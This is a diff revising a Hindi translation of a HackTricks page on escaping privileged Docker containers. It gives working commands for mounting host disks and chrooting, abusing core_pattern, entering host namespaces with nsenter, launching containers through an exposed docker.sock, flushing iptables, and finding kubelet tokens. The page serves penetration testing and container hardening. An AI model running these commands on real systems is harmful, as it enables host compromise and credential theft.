@@ -2,19 +2,19 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Overview
+## अवलोकन
 
 `--privileged` के साथ शुरू किया गया container, एक या दो अतिरिक्त permissions वाले सामान्य container जैसा नहीं होता। व्यवहार में, `--privileged` कई default runtime protections को हटा देता है या कमजोर कर देता है, जो आमतौर पर workload को खतरनाक host resources से दूर रखते हैं। सटीक प्रभाव runtime और host पर निर्भर करता है, लेकिन Docker के लिए सामान्य परिणाम यह होता है:
 
-- सभी capabilities प्रदान की जाती हैं
+- सभी capabilities प्रदान कर दी जाती हैं
 - device cgroup restrictions हटा दी जाती हैं
 - कई kernel filesystems को read-only के रूप में mount करना बंद कर दिया जाता है
 - default masked procfs paths हटा दिए जाते हैं
 - seccomp filtering disabled कर दी जाती है
 - AppArmor confinement disabled कर दिया जाता है
-- SELinux isolation disabled कर दी जाती है या उसकी जगह बहुत व्यापक label लगा दिया जाता है
+- SELinux isolation disabled कर दी जाती है या उसकी जगह कहीं व्यापक label लागू किया जाता है
 
-महत्वपूर्ण परिणाम यह है कि एक privileged container को आमतौर पर किसी subtle kernel exploit की आवश्यकता **नहीं** होती। कई मामलों में यह सीधे host devices, host-facing kernel filesystems या runtime interfaces के साथ interact कर सकता है और फिर host shell में pivot कर सकता है।
+महत्वपूर्ण परिणाम यह है कि एक privileged container को आमतौर पर किसी subtle kernel exploit की आवश्यकता **नहीं** होती। कई मामलों में वह सीधे host devices, host-facing kernel filesystems या runtime interfaces के साथ interact कर सकता है और फिर host shell में pivot कर सकता है।
 
 ## `--privileged` अपने-आप क्या नहीं बदलता
 
@@ -26,13 +26,13 @@
 - visible host devices
 - writable proc/sys interfaces
 
-वास्तविक misconfigurations में इन conditions को पूरा करना अक्सर आसान होता है, लेकिन वैचारिक रूप से ये स्वयं `--privileged` से अलग हैं।
+वास्तविक misconfigurations में इन conditions को पूरा करना अक्सर आसान होता है, लेकिन वैचारिक रूप से ये `--privileged` से अलग हैं।
 
 ## Escape Paths
 
 ### 1. Exposed Devices के माध्यम से Host Disk Mount करना
 
-एक privileged container आमतौर पर `/dev` के अंतर्गत कहीं अधिक device nodes देखता है। यदि host block device दिखाई दे रहा हो, तो सबसे सरल escape उसे mount करना और host filesystem में `chroot` करना है:
+एक privileged container को आमतौर पर `/dev` के अंतर्गत कहीं अधिक device nodes दिखाई देते हैं। यदि host block device visible है, तो सबसे सरल escape उसे mount करके host filesystem में `chroot` करना है:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -46,13 +46,13 @@ fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-यदि व्यावहारिक तरीका `chroot` करने के बजाय किसी writable host mount में setuid helper रखना है, तो याद रखें कि हर filesystem setuid bit को लागू नहीं करता। Host-side capability की त्वरित जाँच है:
+यदि व्यावहारिक तरीका `chroot` करने के बजाय किसी writable host mount में setuid helper रखना है, तो याद रखें कि हर filesystem setuid bit को मान्यता नहीं देता। Host-side capability की त्वरित जाँच यह है:
 ```bash
 mount | grep -v "nosuid"
 ```
 यह उपयोगी है क्योंकि `nosuid` filesystems के अंतर्गत writable paths classic "drop a setuid shell and execute it later" workflows के लिए बहुत कम रुचिकर होते हैं।
 
-यहाँ जिन कमजोर protections का दुरुपयोग किया जा रहा है, वे हैं:
+यहां जिन कमजोर protections का दुरुपयोग किया जा रहा है, वे हैं:
 
 - full device exposure
 - broad capabilities, विशेष रूप से `CAP_SYS_ADMIN`
@@ -69,25 +69,25 @@ protections/namespaces/mount-namespace.md
 
 ### 2. Host Bind Mount को Mount या Reuse करें और `chroot` करें
 
-यदि host root filesystem पहले से ही container के अंदर mounted है, या container privileged होने के कारण आवश्यक mounts बना सकता है, तो host shell अक्सर केवल एक `chroot` दूर होती है:
+यदि host root filesystem पहले से ही container के अंदर mounted है, या container privileged होने के कारण आवश्यक mounts बना सकता है, तो host shell अक्सर केवल एक `chroot` दूर होता है:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-यदि कोई host root bind mount मौजूद नहीं है लेकिन host storage पहुंच योग्य है, तो एक बनाएं:
+यदि कोई host root bind mount मौजूद नहीं है, लेकिन host storage पहुंच योग्य है, तो एक बनाएं:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
 chroot /tmp/host /bin/bash 2>/dev/null
 ```
-यह path निम्न का दुरुपयोग करता है:
+यह path इनका दुरुपयोग करता है:
 
 - कमजोर mount restrictions
 - full capabilities
-- MAC confinement का अभाव
+- MAC confinement की कमी
 
-संबंधित पृष्ठ:
+संबंधित pages:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -105,11 +105,11 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Writable `/proc/sys` या `/sys` का दुरुपयोग
+### 3. Writable `/proc/sys` या `/sys` का दुरुपयोग करें
 
-`--privileged` का एक बड़ा परिणाम यह है कि procfs और sysfs protections बहुत कमजोर हो जाती हैं। इससे host-facing kernel interfaces उजागर हो सकते हैं, जिन्हें सामान्यतः mask किया जाता है या read-only mount किया जाता है।
+`--privileged` का एक बड़ा परिणाम यह है कि procfs और sysfs protections बहुत कमजोर हो जाती हैं। इससे host-facing kernel interfaces उजागर हो सकते हैं, जिन्हें सामान्यतः masked किया जाता है या read-only mount किया जाता है।
 
-एक classic example `core_pattern` है:
+एक classic example `core_pattern` है:<sup>[[1]](#references)</sup>
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -138,12 +138,12 @@ cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-यह तरीका इनका दुरुपयोग करता है:
+यह path इन चीज़ों का दुरुपयोग करता है:
 
 - missing masked paths
 - missing read-only system paths
 
-संबंधित पेज:
+संबंधित पृष्ठ:
 
 {{#ref}}
 protections/masked-paths.md
@@ -155,7 +155,7 @@ protections/read-only-paths.md
 
 ### 4. Mount- या Namespace-Based Escape के लिए Full Capabilities का उपयोग करें
 
-एक privileged container को वे capabilities मिलती हैं जिन्हें आमतौर पर standard containers से हटा दिया जाता है, जिनमें `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` और कई अन्य शामिल हैं। किसी अन्य exposed surface के मौजूद होते ही यह अक्सर local foothold को host escape में बदलने के लिए पर्याप्त होता है।
+एक privileged container को वे capabilities मिलती हैं जिन्हें आमतौर पर standard containers से हटा दिया जाता है, जिनमें `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` और कई अन्य शामिल हैं। जैसे ही कोई अन्य exposed surface मौजूद होता है, यह अक्सर local foothold को host escape में बदलने के लिए पर्याप्त होता है।
 
 एक सरल उदाहरण additional filesystems को mount करना और namespace entry का उपयोग करना है:
 ```bash
@@ -163,7 +163,7 @@ capsh --print | grep cap_sys_admin
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
 ```
-यदि host PID भी shared है, तो चरण और भी छोटा हो जाता है:
+यदि host PID भी साझा किया गया है, तो चरण और भी छोटा हो जाता है:
 ```bash
 ps -ef | head -n 50
 nsenter -t 1 -m -u -n -i -p /bin/bash
@@ -173,7 +173,7 @@ nsenter -t 1 -m -u -n -i -p /bin/bash
 - default privileged capability set
 - optional host PID sharing
 
-संबंधित पृष्ठ:
+संबंधित pages:
 
 {{#ref}}
 protections/capabilities.md
@@ -185,7 +185,7 @@ protections/namespaces/pid-namespace.md
 
 ### 5. Runtime Sockets के माध्यम से Escape
 
-एक privileged container में अक्सर host runtime state या sockets दिखाई देने लगते हैं। यदि Docker, containerd या CRI-O socket तक पहुँचा जा सकता है, तो अक्सर सबसे सरल तरीका runtime API का उपयोग करके host access वाले दूसरे container को launch करना होता है:
+एक privileged container में अक्सर host runtime state या sockets दिखाई देने लगते हैं। यदि Docker, containerd या CRI-O socket तक पहुंच बनाई जा सकती है, तो सबसे सरल तरीका अक्सर runtime API का उपयोग करके host access के साथ दूसरा container launch करना होता है:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -197,9 +197,9 @@ ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 यह path निम्न का दुरुपयोग करता है:
 
 - privileged runtime exposure
-- runtime itself के माध्यम से बनाए गए host bind mounts
+- runtime के माध्यम से बनाए गए host bind mounts
 
-संबंधित pages:
+संबंधित पृष्ठ:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Network Isolation के Side Effects हटाएँ
+### 6. Network Isolation के दुष्प्रभाव हटाना
 
-`--privileged` अपने-आप host network namespace में शामिल नहीं होता, लेकिन यदि container में `--network=host` या अन्य host-network access भी हो, तो पूरा network stack mutable हो जाता है:
+`--privileged` अपने आप host network namespace में शामिल नहीं करता, लेकिन यदि container में `--network=host` या अन्य host-network access भी हो, तो पूरा network stack mutable हो जाता है:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -222,7 +222,7 @@ iptables -F 2>/dev/null
 ```
 यह हमेशा direct host shell नहीं होता, लेकिन इससे denial of service, traffic interception या केवल loopback के लिए उपलब्ध management services तक access मिल सकता है।
 
-संबंधित पृष्ठ:
+Related pages:
 
 {{#ref}}
 protections/capabilities.md
@@ -234,7 +234,7 @@ protections/namespaces/network-namespace.md
 
 ### 7. Host Secrets और Runtime State पढ़ना
 
-भले ही clean shell escape तुरंत संभव न हो, privileged containers के पास अक्सर host secrets, kubelet state, runtime metadata और पड़ोसी containers के filesystems को पढ़ने के लिए पर्याप्त access होता है:
+भले ही clean shell escape तुरंत संभव न हो, privileged containers के पास अक्सर host secrets, kubelet state, runtime metadata और neighboring container filesystems को पढ़ने के लिए पर्याप्त access होता है:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
@@ -242,7 +242,7 @@ find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
 यदि `/var` host-mounted है या runtime directories दिखाई दे रही हैं, तो host shell प्राप्त होने से पहले ही यह lateral movement या cloud/Kubernetes credential theft के लिए पर्याप्त हो सकता है।
 
-संबंधित पृष्ठ:
+Related pages:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -252,7 +252,7 @@ protections/namespaces/mount-namespace.md
 sensitive-host-mounts.md
 {{#endref}}
 
-## जाँच
+## जांच
 
 निम्न commands का उद्देश्य यह पुष्टि करना है कि privileged-container escape की कौन-सी families तुरंत viable हैं।
 ```bash
@@ -263,17 +263,17 @@ grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
 cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
 find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 ```
-यहाँ क्या interesting है:
+यहाँ क्या महत्वपूर्ण है:
 
-- capabilities का पूरा set, विशेष रूप से `CAP_SYS_ADMIN`
+- capabilities का पूरा सेट, विशेष रूप से `CAP_SYS_ADMIN`
 - writable proc/sys exposure
-- visible host devices
+- दिखाई देने वाले host devices
 - seccomp और MAC confinement का अभाव
 - runtime sockets या host root bind mounts
 
-इनमें से कोई एक post-exploitation के लिए पर्याप्त हो सकता है। कई चीज़ें एक साथ होने का आमतौर पर मतलब है कि container host compromise से functional रूप से एक या दो commands दूर है।
+इनमें से कोई एक post-exploitation के लिए पर्याप्त हो सकता है। कई चीज़ें एक साथ होने पर आमतौर पर इसका अर्थ होता है कि container host compromise से केवल एक या दो commands दूर है।
 
-## Related Pages
+## संबंधित पृष्ठ
 
 {{#ref}}
 protections/capabilities.md
@@ -310,4 +310,9 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+
+## संदर्भ
+
+- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)
+
 {{#include ../../../banners/hacktricks-training.md}}
